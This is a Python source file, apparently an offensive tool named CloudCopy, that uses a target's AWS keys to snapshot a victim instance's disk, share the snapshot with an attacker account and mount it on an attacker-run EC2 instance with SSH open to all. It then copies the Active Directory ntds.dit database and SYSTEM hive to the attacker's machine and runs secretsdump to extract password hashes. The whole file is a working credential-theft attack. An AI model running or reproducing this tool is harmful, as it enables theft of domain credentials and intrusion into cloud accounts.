"""
CloudCopy algorithm

IN:
    Target AWS Creds: AWS Secret and AWS Access ID
    Attacker AWS Creds: AWS Secret and AWS Access ID
    Attacker Key File: Key file for accessing new instance
    Attacker Account Id: Attacker account id used for sharing target snapshot with your account
ALGO:
    1.  Load AWS CLI with Target Creds
    2.  Run Describe-Instances and show in list to select
    3.  Run Create-Snapshot on volume from selected instance
    4.  Run modify-snapshot-attribute on new snapshot to set createVolumePermission to attacker AWS Account
    5.  Load AWS CLI with Attacker Creds
    6.  Find current AMI
            aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn2-ami-hvm-2.0.????????-x86_64-gp2'
            'Name=state,Values=available' --output json | jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId'
    7.  Run run-instance command to create new linux ec2 with our stolen snapshot
            aws ec2 run-instances --image-id ami-0c6b1d09930fac512 --count 1 --instance-type t2.micro
            --key-name {AttackerKey} --block-device-mappings '[{"DeviceName":"/dev/sdf","Ebs":{"SnapshotId":"{SNAP_ID}"}}]'
    8.  Ssh run "sudo mkdir /windows"
    9.  Ssh run "sudo mount /dev/xvdf1 /windows/"
    10. Ssh run "sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user"
    11. Ssh run "sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user"
    12. Ssh run "sudo chown ec2-user:ec2-user /home/ec2-user/*"
    13. SFTP get "/home/ec2-user/SYSTEM ./SYSTEM"
    14. SFTP get "/home/ec2-user/ntds.dit ./ntds.dit"
    15. locally run "secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets #expects secretsdump to be on path
OUT:
    secrets dump output files
"""
import argparse
import sys
import time
import warnings

import boto3
from botocore.exceptions import ClientError
from tqdm import tqdm

warnings.filterwarnings(action='ignore', module='.*paramiko.*')
parser = argparse.ArgumentParser()
parser.add_argument("youraccountid", help="your account id for stealing snapshot")
parser.add_argument("yourinstancekey", help="your private key name (without .pem) for accessing the instance")
parser.add_argument("localkeypath", help="local path to key for ssh'ing to new instance")
parser.add_argument("targetaccesskey", help="target AWS Access Key for making snapshot")
parser.add_argument("targetsecretkey", help="target AWS Secret Key for making snapshot")
parser.add_argument("youracccesskey", help="your AWS Access Key for making instance")
parser.add_argument("yoursecretkey", help="your AWS Secret Key for making instance")

args = parser.parse_args()

def viewBar(a,b):
    # original version
    res = a/int(b)*100
    sys.stdout.write('\rComplete precent: %.2f %%' % (res))
    sys.stdout.flush()

def tqdmWrapViewBar(*args, **kwargs):
    try:
        from tqdm import tqdm
    except ImportError:
        # tqdm not installed - construct and return dummy/basic versions
        class Foo():
            @classmethod
            def close(*c):
                pass
        return viewBar, Foo
    else:
        pbar = tqdm(*args, **kwargs)  # make a progressbar
        last = [0]  # last known iteration, start at 0
        def viewBar2(a, b):
            pbar.total = int(b)
            pbar.update(int(a - last[0]))  # update pbar with increment
            last[0] = a  # update last known iteration
        return viewBar2, pbar  # return callback, tqdmInstance

if args.targetaccesskey is args.targetsecretkey is args.youraccountid is args.yourinstancekey is args.localkeypath is None:
    parser.print_help()
elif ".pem" in args.yourinstancekey:
    print("I said no .pem for the key. Try again.")
else:
    ec2 = boto3.client('ec2', aws_access_key_id=args.targetaccesskey, aws_secret_access_key=args.targetsecretkey)
    instances = ec2.describe_instances()['Reservations']
    for index, instance in enumerate(instances):
        if 'Tags' in instance['Instances'][0]:
            print(str(index) + ' - ' + instance['Instances'][0]['InstanceId'] + ":"
                  + instance['Instances'][0]['Tags'][0]['Value'])

    instanceIndex = int(input("which instance are we CloudCopying today?"))
    instance = instances[instanceIndex]['Instances'][0]['InstanceId']
    instanceVolume = instances[instanceIndex]['Instances'][0]['BlockDeviceMappings'][0]['Ebs']['VolumeId']
    print("Instance to CloudCopy: " + instance)
    print("Instance Volume to Snapshot: " + instanceVolume)
    try:
        ec2.create_snapshot(VolumeId=instanceVolume, DryRun=True)
    except ClientError as e:
        if e.response['Error']['Code'] == 'DryRunOperation':
            print("Success")
        elif e.response['Error']['Code'] == 'UnauthorizedOperation':
            print("We do not have the Ec2:CreateSnapshot permission. This attack will not succeed. K-Bye.")
            exit(0)

    response = ec2.create_snapshot(VolumeId=instanceVolume, DryRun=False)
    ec2Snapshot = boto3.resource('ec2', aws_access_key_id=args.targetaccesskey, aws_secret_access_key=args.targetsecretkey)
    snapshot = ec2Snapshot.Snapshot(response['SnapshotId'])
    print(snapshot.id)
    snapshot.load()
    with tqdm(total=100) as progress:
        while snapshot.state != 'completed':
            snapshot.load()
            progAmount = int(snapshot.progress.split('%')[0])
            progress.update(progAmount - progress.n)
            time.sleep(0.1)
            snapshot.load()
        else:
            progress.update(progAmount - progress.n)

    snapshot.modify_attribute(Attribute='createVolumePermission',
                              CreateVolumePermission={'Add': [{'UserId': args.youraccountid}]})

    print("Snapshot should have been shared. Switching to attacker account.")
#    switch to attacker, we use the .aws file for the attacker unless the specify it
    if args.yoursecretkey is not None and args.youracccesskey is not None:
        ec2 = boto3.client("ec2", aws_access_key_id=args.youracccesskey, aws_secret_access_key=args.yoursecretkey)
    else:
        ec2 = boto3.client("ec2")

    if args.yoursecretkey is not None and args.youracccesskey is not None:
        ec2Resource = boto3.resource("ec2", aws_access_key_id=args.youracccesskey, aws_secret_access_key=args.yoursecretkey)
    else:
        ec2Resource = boto3.resource("ec2")

    response = ec2.describe_snapshots(
        SnapshotIds=[
            snapshot.id,
        ],
    )['Snapshots']
    while len(response) == 0:
        response = ec2.describe_snapshots(
        SnapshotIds=[
            snapshot.id,
        ],)['Snapshots']
        print("Snapshot hasn't arrived, waiting...")
        time.sleep(10)

    print("We have the snapshot in our control time to mount it to an instance!")

    security_group_id = None
    try:
        existingSecurityGroup = ec2.describe_security_groups(
            GroupNames=[
                'CredStealerSsh',
            ],
        )['SecurityGroups'][0]
        print("Found existing security group: " + existingSecurityGroup["GroupId"] + ". Someone's done this before ;)")
        security_group_id = existingSecurityGroup["GroupId"]
    except ClientError:
        security_group_id = ec2.create_security_group(
            Description='For connecting to cred stealing instance.',
            GroupName='CredStealerSsh'
        )['GroupId']
        ec2.authorize_security_group_ingress(GroupId=security_group_id, IpProtocol="tcp", CidrIp="0.0.0.0/0",
                                             FromPort=22, ToPort=22)
        print("Finished creating security group for instance")

    newInstance = ec2.run_instances(
        BlockDeviceMappings=[{
            "DeviceName": '/dev/sdf',
            "Ebs": {
                "SnapshotId": snapshot.id
            }
        }],
        SecurityGroupIds=[
            security_group_id,
        ],
        SecurityGroups=[
           'CredStealerSsh',
        ],
        ImageId='ami-0c6b1d09930fac512',
        MaxCount=1,
        MinCount=1,
        InstanceType='t2.micro',
        KeyName=args.yourinstancekey
    )
    newInstanceId = newInstance['Instances'][0]['InstanceId']
    print("instance: " + newInstanceId)

    instance = ec2Resource.Instance(newInstanceId)
    while instance.state['Name'].strip() == "running":
        print(instance.state['Name'], 'running')
        print("Your instance will be arriving shortly...")
        time.sleep(10)
    print("Your instance has arrived. Time to get some sweet sweet creds!")

    import paramiko
    cbk, pbar = tqdmWrapViewBar(ascii=True, unit='b', unit_scale=True)
    key = paramiko.RSAKey.from_private_key_file(args.localkeypath)
    connection = paramiko.SSHClient()
    connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print("Connecting to instance")
    connection.connect(hostname='35.175.243.206', username='ec2-user', pkey=key)
    sftp = connection.open_sftp()
    stdin, stdout, stderr = connection.exec_command("sudo mkdir /windows")
    stdin, stdout, stderr = connection.exec_command("sudo mount /dev/xvdf1 /windows/")
    stdin, stdout, stderr = connection.exec_command("sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user/ntds.dit")
    stdin, stdout, stderr = connection.exec_command("sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user/SYSTEM")
    stdin, stdout, stderr = connection.exec_command("sudo chown ec2-user:ec2-user /home/ec2-user/*")
    print("Pulling the files...")
    try:
        sftp.get("/home/ec2-user/SYSTEM", "./SYSTEM", callback=cbk)
        sftp.get("/home/ec2-user/ntds.dit", "./ntds.dit", callback=cbk)
    except PermissionError:
        print("hmm we don't seem to have control of the files. Maybe just sftp in yourself and run this part.")
    sftp.close()
    cbk = pbar = None # keeps trying to print out status after the files are already copied
    print("finally gonna run secretsdump!")
    import subprocess
    subprocess.run(["secretsdump.py", "-system", "./SYSTEM", "-ntds", "./ntds.dit", "local", "-outputfile", "secrets"])